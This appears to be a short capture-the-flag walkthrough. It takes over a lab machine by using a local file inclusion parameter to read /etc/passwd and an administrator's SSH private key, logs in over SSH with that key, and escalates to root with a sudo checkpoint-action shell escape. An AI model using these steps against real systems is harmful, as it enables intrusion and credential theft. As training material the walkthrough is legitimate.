# 🧠 Walkthrough

## 🔍 Enumeration

```bash
nmap -sV <TARGET_IP>
```

Ports:

* 22 (SSH)
* 80 (HTTP)

---

## 🌐 Web Enumeration

Visit:

```
http://<TARGET_IP>
```

Identify parameter:

```
index.php?page=
```

---

## 🐞 LFI Exploitation

```
?page=/etc/passwd
```

Find user:

```
administrator
```

---

## 🔑 Extract SSH Key

```
?page=/home/administrator/.ssh/id_rsa
```

---

## 🔐 SSH Access

```bash
chmod 600 id_rsa
ssh -i id_rsa administrator@<TARGET_IP>
```

---

## 🔓 Privilege Escalation

```bash
sudo -l
```

```bash
sudo /opt/backup/backup.sh --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

---

## 🏁 Root Access

```bash
cat /root/root.txt
```
